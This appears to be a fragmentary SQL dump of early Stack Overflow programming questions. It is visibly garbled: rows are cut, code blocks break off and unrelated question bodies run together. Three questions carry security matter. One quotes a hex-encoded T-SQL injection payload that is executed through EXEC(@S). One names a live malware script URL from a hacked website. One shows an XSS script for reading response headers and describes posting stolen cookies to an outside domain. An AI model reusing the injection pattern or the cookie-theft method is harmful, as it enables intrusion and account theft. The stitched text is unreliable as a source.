<p>The program below tests the various ways I know of. The inline assembly version is, in theory, the fastest option, though clearly not portable. I''ve included it as a baseline to compare against the other versions. In my tests, with built-ins, the <code>4 * atan(1)</code> version is fastest on GCC 4.2, because it auto-folds the <code>atan(1)</code> into a constant. With <code>-fno-builtin</code> specified, the <code>atan2(0, -1)</code> version is fastest.</p>

It seems very feature-complete and nicely integrated into the Windows shell, and more importantly, it''s fairly painless to teach to colleagues with little or no experience with source control.  <strong>However</strong>, since we have moved to Windows Vista 64bit, Tortoise has been very buggy and has seemed to cause lots of explorer.exe abnormalities and crashes.

Without going into details, the attack attempts to execute SQL code by encoding the <a href="http://en.wikipedia.org/wiki/Transact-SQL" rel="noreferrer">T-SQL</a> commands in an ASCII encoded BINARY string. It looks something like this:</p>

<pre><code>DECLARE%20@S%20NVARCHAR(4000);SET%20@S=CAST(0x44004500...06F007200%20AS%20NVARCHAR(4000));EXEC(@S);--
</code></pre>

<p>I was able to decode this in SQL, but I was a little wary of doing this since I didn''t know exactly what was happening at the time.</p>

<p>I tried to write a simple decode tool, so I could decode this type of text without even touching <a href="http://en.wikipedia.org/wiki/Microsoft_SQL_Server" rel="noreferrer">SQL&nbsp; Server</a>. The main part I need to be decoded is:</p>

<pre><code>CAST(0x44004500...06F007200 AS
NVARCHAR(4000))
</code></pre>

<p>I''ve tried all of the following commands with no luck:</p>

<pre><code>txtDecodedText.Text =
    System.Web.HttpUtility.UrlDecode(txtURLText.Text);
txtDecodedText.Text =
    Encoding.ASCII.GetString(Encoding.ASCII.GetBytes(txtURLText.Text));

    Encoding.ASCII.GetString(Encoding.Unicode.GetBytes(txtURLText.Text));
txtDecodedText.Text =
    Encoding.Unicode.GetString(Convert.FromBase64String(txtURLText.Text));
</code></pre>

<p>What is the proper way to translate this encoding without using SQL Server? Is it possible? I''ll take VB.NET code since I''m familiar with that too.</p>

<hr>

<p>Okay, I''m sure I''m missing something here, so here''s where I''m at.</p>

<p>Since my input is a basic string, I started with just a snippet of the encoded portion - 4445434C41 (which translates to DECLA) - and the first attempt was to do this...</p>

<pre><code>txtDecodedText.Text = Encoding.UTF8.GetString(Encoding.UTF8.GetBytes(txtURL.Text));
</code></pre>

<p>...and all it did was return the exact same thing that I put in since it converted each character into is a byte.</p>

<p>I realized that I need to parse every two characters into a byte manually since I don''t know of any methods yet that will do that, so now my little decoder looks something like this:</p>

<pre><code>while (!boolIsDone)
{
    bytURLChar = byte.Parse(txtURLText.Text.Substring(intParseIndex, 2));
    bytURL[intURLIndex] = bytURLChar;
    intParseIndex += 2;
    intURLIndex++;

    if (txtURLText.Text.Length - intParseIndex &lt; 2)
    {
        boolIsDone = true;
    }
}

txtDecodedText.Text = Encoding.UTF8.GetString(bytURL);
</code></pre>

<p>Things look good for the first couple of pairs, but then the loop balks when it gets to the "4C" pair and says that the string is in the incorrect format.</p>

<p>Interestingly enough, when I step through the debugger and to the GetString method on the byte array that I was able to parse up to that point, I get ",-+" as the result.</p>

<p>How do I figure out what I''m missing - do I need to do a "direct cast" for each byte instead of attempting to parse it?</p>',71,67,'2008-08-01T15:23:05.190Z',20,64,'c#','sql','vb.net','ascii','hex',NULL);

So, I may be starting off from a false assumption from the get go. It appears that people answering this question are maybe saying that you should have public properties and that those don''t need getters and setters, which goes against what I was taught, and what I was talking about, although maybe that needs to be discussed as well.

<p><em>Update.  This is how I ended up doing it:</em></p>

<ul>
<li>Back up the database in question and Master on <code>6.5</code>.</li>
<li>Execute <code>SQL Server 2000</code>''s <code>instcat.sql</code> against <code>6.5</code>''s Master.  This allows <code>SQL Server 2000</code>''s OLEDB provider to connect to <code>6.5</code>.</li>
<li>Use <code>SQL Server 2000</code>''s standalone <code>"Import and Export Data"</code> to create a DTS package, using <code>OLEDB</code> to connect to 6.5.  This successfully copied all <code>6.5</code>''s tables to a new <code>2005</code> database (also using <code>OLEDB</code>).</li>
<li>Use <code>6.5</code>''s Enterprise Manager to script out all of the database''s indexes and triggers to a .sql file.</li>
<li>Execute that .sql file against the new copy of the database, in 2005''s Management Studio.</li>
<li>Use 6.5''s Enterprise Manager to script out all of the stored procedures.</li>
<li>Execute that <code>.sql</code> file against the <code>2005</code> database.  Several dozen sprocs had issues making them incompatible with <code>2005</code>.  Mainly <code>non-ANSI joins</code> and <code>quoted identifier issues</code>.</li>
<li>Corrected all of those issues and re-executed the <code>.sql</code> file.</li>
<li>Recreated the <code>6.5</code>''s logins in <code>2005</code> and gave them appropriate permissions.</li>
</ul>

<p>There was a bit of rinse/repeat when correcting the stored procedures (there were hundreds of them to correct), but the upgrade went great otherwise.</p>

<p>Being able to use Management Studio instead of <code>Query Analyzer</code> and <code>Enterprise Manager 6.5</code> is such an amazing difference.

INSERT INTO questions VALUES (1131,'Windows Help files - what are the options?','<p>Back in the old days, Help was not trivial but possible: generate some funky .rtf file with special tags, run it through a compiler, and you got a WinHelp file (.hlp) that actually works really well.</p>

<p>Then, Microsoft decided that WinHelp was not hip and cool anymore and switched to CHM, up to the point they actually axed WinHelp from Vista.</p>

<p>Now, CHM maybe nice, but everyone that tried to open a .chm file on the Network will know the nice "Navigation to the webpage was canceled" screen that is caused by security restrictions.</p>

<p>While there are ways to make CHM work off the network, this is hardly a good choice, because when a user presses the Help Button he wants help and not have to make some funky settings.</p>

<p>Bottom Line: I find CHM absolutely unusable. But with WinHelp not being an option anymore either, I wonder what the alternatives are, especially when it comes to integrate with my Application (i.e. for WinHelp and CHM there are functions that allow you to directly jump to a topic)?</p>

<p>PDF has the disadvantage of requiring the Adobe Reader (or one of the more lightweight ones that not many people use). I could live with that seeing as this is kind of standard nowadays, but can you tell it reliably to jump to a given page/anchor?</p>

<p>HTML files seem to be the best choice, you then just have to deal with different browsers (CSS and stuff).</p>

<p><em>Edit:</em> I am looking to create my own Help Files. As I am a fan of the "No Setup, Just Extract and Run" Philosophy, i had that problem many times in the past because many of my users will run it off the network, which causes exactly this problem.</p>

<p>So i am looking for a more robust and future-proof way to provide help to my users without having to code a different help system for each application i make.</p>

<p>CHM is a really nice format, but that Security Stuff makes it unusable, as a Help system is supposed to provide help to the user, not to generate even more problems.</p>',91,37,'2008-08-04T10:43:05.707Z',65,73,'windows','language-agnostic','chm','winhelp',NULL,NULL);

<p><strong>Scenario</strong></p>
<p>I want to offer a dynamic permission system that can work on different parameters. Let''s say that I want to give either a department or just a specific person access to an application. And pretend that we have a number of applications that keeps growing.</p>
<p>In the past, I have chosen one of the following two ways that I know to do this.</p>
<ol>
<li><p>Use a single permission table with special columns that are used for
determining a how to apply the parameters. The special columns in
this example are <code>TypeID</code> and <code>TypeAuxID</code>. The SQL would look something
like this.</p>
<pre><code>SELECT COUNT(PermissionID)
FROM application_permissions
WHERE
(TypeID = 1 AND TypeAuxID = @UserID) OR
(TypeID = 2 AND TypeAuxID = @DepartmentID)
AND ApplicationID = 1

</li>
<li><p>Use a mapping table for each type of permission, then joining them
all together.</p>
<pre><code>SELECT COUNT(perm.PermissionID)
FROM application_permissions perm

ON perm.ApplicationID = emp.ApplicationID
LEFT JOIN application_DepartmentPermissions dept

<li>Python 2.5 and earlier: there is <em>no way</em> to express binary literals.</li>
<li>Python 2.6 beta: You can do like so: <code>0b1100111</code> or <code>0B1100111</code>.</li>
<li>Python 2.6 beta: will also allow <code>0o27</code> or <code>0O27</code> (second character is the letter O) to represent an octal.</li>

From the UI perspective, the DataContext is a design of the sections of your database that you would like to expose to through LinqToSql and is integral in setting up the ORM features of LinqToSql.</p>

<p>My question is: I am setting up a project that uses a large database where all tables are interconnected in some way through Foreign Keys. My first inclination is to make one huge DataContext class that models the entire database. That way I could in theory (though I don''t know if this would be needed in practice) use the Foreign Key connections that are generated through LinqToSql to easily go between related objects in my code, insert related objects, etc.</p>

<p>However, after giving it some thought, I am now thinking that it may make more sense to create multiple DataContext classes, each one relating to a specific namespace or logical interrelated section within my database. My main concern is that instantiating and disposing one huge DataContext class all the time for individual operations that relate to specific areas of the Database would be impose an unnecessary imposition on application resources. Additionally, it is easier to create and manage smaller DataContext files than one big one. The thing that I would lose is that there would be some distant sections of the database that would not be navigable through LinqToSql (even though a chain of relationships connects them in the actual database). Additionally, there would be some table classes that would exist in more than one DataContext.</p>

<p>Any thoughts or experience on whether multiple DataContexts (corresponding to DB namespaces) are appropriate in place of (or in addition to) one very large DataContext class (corresponding to the whole DB)?</p>',51,9,'2008-08-05T05:54:34.697Z',16,68,'asp.net','.net','linq-to-sql','datacontext',NULL,NULL);

INSERT INTO questions VALUES (2328,'Tracking state using ASP.NET AJAX / ICallbackEventHandler','<p>I have a problem with maintaining state in an ASP.NET AJAX page. Short version: I need some way to update the page ViewState after an async callback has been made, to reflect any state changes the server made during the async call. </p>

<p>This seems to be a common problem, but I will describe my scenario to help explain:</p>

<p>I have a grid-like control which has some JavaScript enhancements - namely, the ability to drag and drop columns and rows. When a column or row is dropped into a new position, an AJAX method is invoked to notify the control server-side and fire a corresponding server-side event ("OnColumnMoved" or "OnRowMoved").</p>

<p>ASP.NET AJAX calls, by default, send the entire page as the request. That way the page goes through a complete lifecycle, viewstate is persisted and the state of the control is restored before the RaiseCallbackEvent method is invoked.</p>

<p>However, since the AJAX call does not update the page, the ViewState reflects the <em>original</em> state of the control, even after the column or row has been moved. So the second time a client-side action occurs, the AJAX request goes to the server and the page &amp; control are built back up again to reflect the <em>first</em> state of the control, not the state after the first column or row was moved.</p>

<p>This problem extends to many implications. For example if we have a client-side/AJAX action to add a new item to the grid, and then a row is dragged, the grid is built server-side with one less item than on the client-side.</p>

<p>And finally &amp; most seriously for my specific example, the actual data source object we are acting upon is stored in the page ViewState. That was a design decision to allow keeping a stateful copy of the manipulated data which can either be committed to DB after many manipulations or discarded if the user backs out. That is very difficult to change.</p>

<p>So, again, I need a way for the page ViewState to be updated on callback after the AJAX method is fired.</p>',67,62,'2008-08-05T13:52:12.720Z',39,60,'asp.net','ajax','asp.net-ajax','viewstate',NULL,NULL);

INSERT INTO questions VALUES (2970,'My website got hacked.. What should I do?','<p>My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn''t technical at all, and built the whole thing with a WYSIWYG editor.</p>

<p>I popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): <a href="http://www.98hs.ru/js.js" rel="noreferrer">http://www.98hs.ru/js.js</a> &lt;-- <strong>TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.</strong></p>

<p>So I commented it out for now. It turns out his FTP password was a plain dictionary word six letters long, so we think that''s how it got hacked. We''ve changed his password to an 8+ digit non-word string (he wouldn''t go for a passphrase since he is a hunt-n-peck typer).</p>

<p>I did a <a href="http://whois.domaintools.com/98hs.ru" rel="noreferrer">whois on 98hs.ru</a> and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked...</p>

<p>I have no idea what to do at this point though as I''ve never dealt with this sort of thing before. Anyone have any suggestions?</p>

<p>He was using plain jane un-secured ftp through webhost4life.com. I don''t even see a way to <em>do</em> sftp on their site. I''m thinking his username and password got intercepted?</p>

<p><strong>So, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked?</strong></p>

<p>For the record, here is the line of code that "magically" got added to his file (and isn''t in his file on his computer -- I''ve left it commented out just to make absolute sure it won''t do anything on this page, although I''m sure Jeff would guard against this):</p>

what my options are.</p>

<p>Downsides to ClickOnce:</p>

<ul>
<li>Consists of multiple files - Seems easier to distribute one file than manageing a bunch of file and the downloader to download those files.</li>
<li>You have to build it again for CD installations (for when the end user dosn''t have internet)</li>
<li>Program does not end up in Program Files - It ends up hidden away in some application catch folder, making it much harder to shortcut to.</li>
</ul>

<p>Pros to ClickOnce:</p>

<ul>
<li>It works. Magically. And it''s built
into VisualStudio 2008 express.</li>
<li>Makes it easy to upgrade the
application.</li>
</ul>

<p>Does Windows Installer do these things as well? I know it dosen''t have any of the ClickOnce cons, but It would be nice to know if it also has the ClickOnce pros.</p>

<p><strong>Update</strong>:
I ended up using Wix 2 (Wix 3 was available but at the time I did the project, no one had a competent tutorial). It was nice because it supported the three things I (eventually) needed. An optional start-up-with-windows shortcut, a start-up-when-the-installer-is-done option, and three paragraphs of text that my boss thinks will keep uses from clicking the wrong option.</p>',30,79,'2008-08-06T15:25:51.237Z',98,91,'vb.net','visual-studio','installation','clickonce',NULL,NULL);

<p>EDIT:
The goal is find the date and time that you get as a result of adding several hours to the current time. This is used to determine a default value for a due date of a submission. I want to add 3 hours to the current time to get the due date time. However, I don''t want due dates that go beyond 5pm on the current day. So, I tried to have the hours split between (today, up to 5pm) and (tomorrow, from 8am on), such that adding 3 hours to 4pm would give you 19am, because 1 hour is added to the end of today and 2 hours are added to the beginning of tomorrow.</p>',106,69,'2008-08-07T20:21:52.433Z',11,62,'vb.net','date',NULL,NULL,NULL,NULL);
INSERT INTO questions VALUES (5328,'Why can''t I use a try block around my super() call?','<p>So, in Java, the first line of your constructor HAS to be a call to super... be it implicitly calling super(), or explicitly calling another constructor.  What I want to know is, why can''t I put a try block around that?</p>

<p>My specific case is that I have a mock class for a test.  There is no default constructor, but I want one to make the tests simpler to read.  I also want to wrap the exceptions thrown from the constructor into a RuntimeException.</p>

<p>So, what I want to do is effectively this:</p>

<pre><code>public class MyClassMock extends MyClass {
    public MyClassMock() {
        try {
            super(0);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    // Mocked methods
}
</code></pre>

<p>But Java complains that super isn''t the first statement.</p>

<p>My workaround:</p>

<pre><code>public class MyClassMock extends MyClass {
    public static MyClassMock construct() {
        try {
            return new MyClassMock();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public MyClassMock() throws Exception {
        super(0);
    }

    // Mocked methods
}
</code></pre>

<p>Is this the best workaround?  Why doesn''t Java let me do the former?</p>

<hr>

<p>My best guess as to the "why" is that Java doesn''t want to let me have a constructed object in a potentially inconsistent state... however, in doing a mock, I don''t care about that.  It seems I should be able to do the above... or at least I know that the above is safe for my case... or seems as though it should be anyways.</p>

<p>Is there a configuration file I can update to tell the JRE to use Pacific with all the associated daylight savings time information?  The time on my machine shows correctly, so it doesn''t seem to be an OS-wide misconfiguration.</p>

<p>Ok, here''s an update. A coworker suggested I update JAVA_OPTS in my /etc/profile to include "-Duser.timezone=US/Pacific", which worked (I also saw CATALINA_OPTS, which I updated as well). Actually, I just exported the change into the variables rather than use the new /etc/profile (a reboot later will pick up the changes and I will be golden).</p>

<p>However, I still think there is a better solution... there should be a configuration for Java somewhere that says what timezone it is using, or how it is grabbing the timezone. If someone knows such a setting, that would be awesome, but for now this is a decent workaround.</p>

<hr>

<p>I am using 1.5, and it is most definitely a DST problem.  As you can see, the time zone is set to not use daylight savings.  My belief is it is generically set to -8 offset rather than the specific Pacific timezone.  Since the generic -8 offset has no daylight savings info, it''s of course not using it, but the question is, where do I tell Java to use Pacific time zone when it starts up?  I''m NOT looking for a programmatic solution, it should be a configuration solution.</p>',122,40,'2008-08-08T21:24:01.490Z',10,72,'java','linux','timezone',NULL,NULL,NULL);

INSERT INTO questions VALUES (12516,'Expression Evaluation and Tree Walking using polymorphism? (ala Steve Yegge)','<p>This morning, I was reading <a href="http://steve.yegge.googlepages.com/when-polymorphism-fails" rel="noreferrer">Steve Yegge''s: When Polymorphism Fails</a>, when I came across a question that a co-worker of his used to ask potential employees when they came for their interview at Amazon.</p>

<blockquote>
  <p>As an example of polymorphism in
  action, let''s look at the classic
  "eval" interview question, which (as
  far as I know) was brought to Amazon
  by Ron Braunstein. The question is
  quite a rich one, as it manages to
  probe a wide variety of important
  skills: OOP design, recursion, binary
  trees, polymorphism and runtime
  typing, general coding skills, and (if
  you want to make it extra hard)
  parsing theory.</p>
  
  <p>At some point, the candidate hopefully
  realizes that you can represent an
  arithmetic expression as a binary
  tree, assuming you''re only using
  binary operators such as "+", "-",
  "*", "/". The leaf nodes are all
  numbers, and the internal nodes are
  all operators. Evaluating the
  expression means walking the tree. If
  the candidate doesn''t realize this,
  you can gently lead them to it, or if
  necessary, just tell them.</p>
  
  <p>Even if you tell them, it''s still an
  interesting problem.</p>
  
  <p>The first half of the question, which
  some people (whose names I will
  protect to my dying breath, but their
  initials are Willie Lewis) feel is a
  Job Requirement If You Want To Call
  Yourself A Developer And Work At
  Amazon, is actually kinda hard. The
  question is: how do you go from an
  arithmetic expression (e.g. in a
  string) such as "2 + (2)" to an
  expression tree. We may have an ADJ
  challenge on this question at some
  point.</p>
  
  <p>The second half is: let''s say this is
  a 2-person project, and your partner,
  who we''ll call "Willie", is
  responsible for transforming the
  string expression into a tree. You get
  the easy part: you need to decide what
  classes Willie is to construct the
  tree with. You can do it in any
  language, but make sure you pick one,
  or Willie will hand you assembly
  language. If he''s feeling ornery, it
  will be for a processor that is no
  longer manufactured in production.</p>
  
  <p>You''d be amazed at how many candidates
  boff this one.</p>
  
  <p>I won''t give away the answer, but a
  Standard Bad Solution involves the use
  of a switch or case statment (or just
  good old-fashioned cascaded-ifs). A
  Slightly Better Solution involves
  using a table of function pointers,
  and the Probably Best Solution
  involves using polymorphism. I
  encourage you to work through it
  sometime. Fun stuff!</p>
</blockquote>

<p>So, let''s try to tackle the problem all three ways.  How do you go from an arithmetic expression (e.g. in a string) such as "2 + (2)" to an expression tree using cascaded-if''s, a table of function pointers, and/or polymorphism?  </p>

<p>How would you go about finding the best combination programmatically?</p>

<p>My best attempt so far (third or fourth algorithm) is:</p>

<ol>
<li>Find the longest shipper for each leg</li>
<li>Eliminate the most "expensive" one</li>
<li>Find the cheapest shipper for each leg</li>
<li>Calculate the total cost &amp; days</li>
<li>If days are acceptable, finish, else, goto 1</li>
</ol>

<p>Quickly mocked-up in PHP (note that the test array below works swimmingly, but if you try it with the test array from above, it does not find the correct combination):</p>

To clarify, this isn''t a "homework" assignment (I''m not in school). It is part of my current project at work.</p>

<p>The requirements (as always) have been constantly changing. If I were given the current constraints at the time I began working on this problem, I would be using some variant of the A* algorithm (or Dijkstra''s or shortest path or simplex or something). But everything has been morphing and changing, and that brings me to where I''m at right now.</p>

INSERT INTO questions VALUES (16155,'Making one interface overwrite a method it inherits from another interface in PHP','<p><strong>Is there a way in PHP to overwrite a method declared by one interface in an interface extending that interface?</strong></p>

<p>The Example:</p>

<p>I''m probably doing something wrong, but here is what I have:</p>

<pre><code>interface iVendor{
    public function __construct($vendors_no = null);
    public function getName();
    public function getVendors_no();
    public function getZip();
    public function getCountryCode();
    public function setName($name);
    public function setVendors_no($vendors_no);
    public function setZip($zip);
    public function setCountryCode($countryCode);
}

interface iShipper extends iVendor{
    public function __construct($vendors_no = null, $shipment = null);
    public function getTransitTime($shipment = null);
    public function getTransitCost($shipment = null);
    public function getCurrentShipment();
    public function setCurrentShipment($shipment);
    public function getStatus($shipment = null);
}
</code></pre>

<p>Normally in PHP, when you extend something, you can overwrite any method contained therein (right?). However, when one interface extends another, it won''t let you. Unless I''m thinking about this wrong... When I implement the iShipper interface, I don''t have to make the Shipper object extend the Vendor object (that implements the iVendor interface). I just say:</p>

<pre><code>class FedEx implements iShipper{}
</code></pre>

<p>and make FedEx implement all of the methods from iVendor and iShipper. However, I need the <code>__construct</code> functions in iVendor and iShipper to be unique. I know I could take out the <code>$shipment = null</code>, but then it wouldn''t be as convenient to create Shippers (by just passing in the vendors_no and the shipment while instantiating).</p>

<p>Anyone know how to make this work? My fallback is to have to set the shipment by calling <code>$shipper-&gt;setShipment($shipment);</code> on the Shipper after I instantiate it, but I''m hoping for a way to get around having to do that...</p>

<p><em>A little more explanation for the curious:</em><br>
<em>The FedEx Object has methods that go to the FedEx site (using cURL) and gets an estimate for the Shipment in question. I have a UPS Object, a BAXGlobal Object, a Conway Object, etc. Each one has COMPLETELY different methods for actually getting the shipping estimate, but all the system needs to know is that they are a "shipper" and that the methods listed in the interface are callable on them (so it can treat them all exactly the same, and loop through them in a "shippers" array calling <code>getTransitX()</code> to find the best shipper for a shipment).</em>  </p>

<p><em>Each "Shipper" is also a "Vendor" though, and is treated as such in other parts of the system (getting and putting in the DB, etc. Our data design is a pile of crap, so FedEx is stored right alongside companies like Dunder Mifflin in the "Vendors" table, which means it gets to have all the properties of every other Vendor, but needs the extra properties and methods supplied by iShipper).</em></p>',58,79,'2008-08-19T13:32:12.247Z',67,11,'php','oop','interface','extends',NULL,NULL);

<pre><code>void webBrowserNavigating(object sender, WebBrowserNavigatingEventArgs e)

<p>The property table is a basic keyword/value type table. So you have the keyword ATK and the value assigned to it. There is another property called SpecialType which a card can have multiple values for, such as "Sycnro" and "DARK"</p>

<p>What I''d like to do is create a view or stored procedure that gives me the Card Id, Card Name, and all the property keywords assigned to the card as columns and their values in the ResultSet for a card specified. So ideally I''d have a result set like:</p>

INSERT INTO questions VALUES (20047,'Diagnosing Deadlocks in SQL Server 2005','<p>We''re seeing some pernicious, but rare, deadlock conditions in the Stack Overflow SQL Server 2005 database.</p>

<p>I attached the profiler, set up a trace profile using <a href="http://www.simple-talk.com/sql/learn-sql-server/how-to-track-down-deadlocks-using-sql-server-2005-profiler/" rel="noreferrer">this excellent article on troubleshooting deadlocks</a>, and captured a bunch of examples. The weird thing is that <strong>the deadlocking write is <em>always</em> the same</strong>:</p>

<pre><code>UPDATE [dbo].[Posts]
SET [AnswerCount] = @p1, [LastActivityDate] = @p2, [LastActivityUserId] = @p3
WHERE [Id] = @p0
</code></pre>

<p>The other deadlocking statement varies, but it''s usually some kind of trivial, simple <strong>read</strong> of the posts table. This one always gets killed in the deadlock. Here''s an example</p>

<pre><code>SELECT
[t0].[Id], [t0].[PostTypeId], [t0].[Score], [t0].[Views], [t0].[AnswerCount], 
[t0].[AcceptedAnswerId], [t0].[IsLocked], [t0].[IsLockedEdit], [t0].[ParentId], 
[t0].[CurrentRevisionId], [t0].[FirstRevisionId], [t0].[LockedReason],
[t0].[LastActivityDate], [t0].[LastActivityUserId]
FROM [dbo].[Posts] AS [t0]
WHERE [t0].[ParentId] = @p0
</code></pre>

<p>To be perfectly clear, we are not seeing write / write deadlocks, but read / write.</p>

<p>We have a mixture of LINQ and parameterized SQL queries at the moment. We have added <code>with (nolock)</code> to all the SQL queries. This may have helped some. We also had a single (very) poorly-written badge query that I fixed yesterday, which was taking upwards of 20 seconds to run every time, and was running every minute on top of that. I was hoping this was the source of some of the locking problems!</p>

<p>Unfortunately, I got another deadlock error about 2 hours ago. Same exact symptoms, same exact culprit write.</p>

<p>The truly strange thing is that the locking write SQL statement you see above is part of a very specific code path. It''s <em>only</em> executed when a new answer is added to a question -- it updates the parent question with the new answer count and last date/user. This is, obviously, not that common relative to the massive number of reads we are doing! As far as I can tell, we''re not doing huge numbers of writes anywhere in the app.</p>

<p>I realize that NOLOCK is sort of a giant hammer, but most of the queries we run here don''t need to be that accurate. Will you care if your user profile is a few seconds out of date?</p>

<p>Using NOLOCK with Linq is a bit more difficult as <a href="http://www.hanselman.com/blog/GettingLINQToSQLAndLINQToEntitiesToUseNOLOCK.aspx" rel="noreferrer">Scott Hanselman discusses here</a>.</p>

<p>We are flirting with the idea of using</p>

<pre><code>SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED
</code></pre>

<p>on the base database context so that all our LINQ queries have this set. Without that, we''d have to wrap every LINQ call we make (well, the simple reading ones, which is the vast majority of them) in a 3-4 line transaction code block, which is ugly.</p>

<p>I guess I''m a little frustrated that trivial reads in SQL 2005 can deadlock on writes. I could see write/write deadlocks being a huge issue, but <em>reads?</em> We''re not running a banking site here, we don''t need perfect accuracy every time.</p>

<p>I''m creating a procedure that is going to take a list of keywords to be searched for in a column that contains text. If I was sitting at the console, I''d execute it as such:</p>

<p>But a trick I picked up a little while go to do "strongly typed" list parsing in a stored procedure is to parse the list into a table variable/temporary table, converting it to the proper type and then doing an INNER JOIN against that table in my final result set. This works great when sending say a list of integer IDs to the procedure. I wind up having a final query that looks like this:</p>

<pre><code>SELECT Id, Name, Description
  FROM dbo.Card
       INNER JOIN @tblExclusiveCard ON dbo.Card.Id = @tblExclusiveCard.CardId
</code></pre>

<p>I want to use this trick with a list of strings. But since I''m looking for a particular keyword, I am going to use the LIKE clause. So ideally I''m thinking I''d have my final query look like this:</p>

<pre><code>SELECT Id, Name, Description
  FROM dbo.Card
       INNER JOIN @tblKeyword ON dbo.Card.Description LIKE ''%'' + @tblKeyword.Value + ''%''
</code></pre>

<p>Is this possible/recommended?</p>

<p>Is there a better way to do something like this?</p>

<hr>

<p>The reason I''m putting wildcards on both ends of the clause is because there are "archfiend", "beast-warrior", "direct-damage" and "battle-damage" terms that are used in the card texts.</p>

<p><em>Edit:</em> Microsoft created a way to prevent XSS attacks by disallowing JavaScript access to cookies if HttpOnly is specified. FireFox later adopted this. So my question is: If you are using AJAX on a site, like StackOverflow, are Http-Only cookies an option?</p>

<p><em>Edit 2:</em> Question 2. If the purpose of HttpOnly is to prevent JavaScript access to cookies, and you can still retrieve the cookies via JavaScript through the XmlHttpRequest Object, <strong>what is the point of HttpOnly</strong>?</p>

<p><em>Edit 3:</em> Here is a quote from Wikipedia:</p>

<blockquote>
  <p>When the browser receives such a cookie, it is supposed to use it as usual in the following HTTP exchanges, but not to make it visible to client-side scripts.[32] The <code>HttpOnly</code> flag is not part of any standard, and is not implemented in all browsers. Note that there is currently no prevention of reading or writing the session cookie via a XMLHTTPRequest. [33].</p>
</blockquote>

<p>I understand that <code>document.cookie</code> is blocked when you use HttpOnly. But it seems that you can still read cookie values in the XMLHttpRequest object, allowing for XSS. How does HttpOnly make you any safer than? By making cookies essentially read only? </p>

<p>In your example, I cannot write to your <code>document.cookie</code>, but I can still steal your cookie and post it to my domain using the XMLHttpRequest object.</p>

<pre><code>&lt;script type="text/javascript"&gt;
    var req = null;
    try { req = new XMLHttpRequest(); } catch(e) {}
    if (!req) try { req = new ActiveXObject("Msxml2.XMLHTTP"); } catch(e) {}
    if (!req) try { req = new ActiveXObject("Microsoft.XMLHTTP"); } catch(e) {}
    req.open(''GET'', ''http://stackoverflow.com/'', false);
    req.send(null);
    alert(req.getAllResponseHeaders());
&lt;/script&gt;
</code></pre>

<p><em>Edit 4:</em> Sorry, I meant that you could send the XMLHttpRequest to the StackOverflow domain, and then save the result of getAllResponseHeaders() to a string, regex out the cookie, and then post that to an external domain. It appears that Wikipedia and ha.ckers concur with me on this one, but I would love be re-educated...</p>

<p><em>Final Edit:</em> Ahh, apparently both sites are wrong, this is actually a <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=380418" rel="noreferrer">bug in FireFox</a>. IE6 &amp; 7 are actually the only browsers that currently fully support HttpOnly.</p>

<p>To reiterate everything I''ve learned:</p>

<ul>
<li>HttpOnly restricts all access to document.cookie in IE7 &amp; and FireFox (not sure about other browsers)</li>
<li>HttpOnly removes cookie information from the response headers in XMLHttpObject.getAllResponseHeaders() in IE7.</li>
<li>XMLHttpObjects may only be submitted to the domain they originated from, so there is no cross-domain posting of the cookies.</li>

INSERT INTO questions VALUES (30566,'Delayed Write Failed on Windows 2003 Clustered Fileshare','<p>I am trying to solve a persistent IO problem when we try to read or write to a Windows 2003 Clustered Fileshare.  It is happening regularly and seem to be triggered by traffic.  We are writing via .NET''s FileStream object.</p>

<p>Basically we are writing from a Windows 2003 Server running IIS to a Windows 2003 file share cluster.  When writing to the file share, the IIS server often gets two errors.  One is an Application Popup from Windows, the other is a warning from MRxSmb.  Both say the same thing:</p>

<blockquote>
  <p>[Delayed Write Failed] Windows was unable to save all the data for the file \Device\LanmanRedirector.  The data has been lost.  This error may be caused by a failure of your computer hardware or network connection.  Please try to save this file elswhere.</p>
</blockquote>

<p>On reads, we are also getting errors, which are System.IO.IOException errors: "The specified network name is no longer available."</p>

<p>We have other servers writing more and larger files to this File Share Cluster without an issue.  It''s only coming from the one group of servers that the issue comes up.  So it doesn''t seem related to writing large files.  We''ve applied all the hotfixes referenced in articles online dealing with this issue, and yet it continues.</p>

<p>Our network team ran Network  Monitor and didn''t see any packet loss, from what I understand, but as I wasn''t present for that test I can''t say that for certain.</p>

<p>Any ideas of where to check?  I''m out of avenues to explore or tests to run.  I''m guessing the issue is some kind of network problem, but as it''s only happening when these servers connect to that File Share cluster, I''m not sure what kind of problem it might be.</p>

<p>This issue is awfully specific, and potentially hardware related, but any help you can give would be of assistance.</p>

INSERT INTO questions VALUES (31498,'Best way to test if a generic type is a string? (C#)','<p>I have a generic class that should allow any type, primitive or otherwise. The only problem with this is using <code>default(T)</code>. When you call default on a value type or a string, it initializes it to a reasonable value (such as empty string). When you call <code>default(T)</code> on an object, it returns null. For various reasons we need to ensure that if it is not a primitive type, then we will have a default instance of the type, <strong>not</strong> null. Here is attempt 1:</p>

<pre><code>T createDefault()
{
    if(typeof(T).IsValueType)

<p>Problem - string is not a value type, but it does not have a parameterless constructor. So, the current solution is:</p>

INSERT INTO questions VALUES (40966,'Should I use window.onload or script block?','<p>I have a javascript function that manipulates the DOM when it is called (adds CSS classes, etc).  This is invoked when the user changes some values in a form.  When the document is first loading, I want to invoke this function to prepare the initial state (which is simpler in this case than setting up the DOM from the server side to the correct initial state).</p>

<p>Is it better to use window.onload to do this functionality or have a script block after the DOM elements I need to modify?  For either case, why is it better?</p>

<p>For example:</p>

<pre><code>function updateDOM(id) {
    // updates the id element based on form state
}
</code></pre>

<p>should I invoke it via:</p>

<pre><code>window.onload = function() { updateDOM("myElement"); };

<pre><code>&lt;div id="myElement"&gt;...&lt;/div&gt;
&lt;script language="javascript"&gt;
    updateDOM("myElement");
&lt;/script&gt;
</code></pre>

<p>The former seems to be the standard way to do it, but the latter seems to be just as good, perhaps better since it will update the element as soon as the script is hit, and as long as it is placed after the element, I don''t see a problem with it.</p>

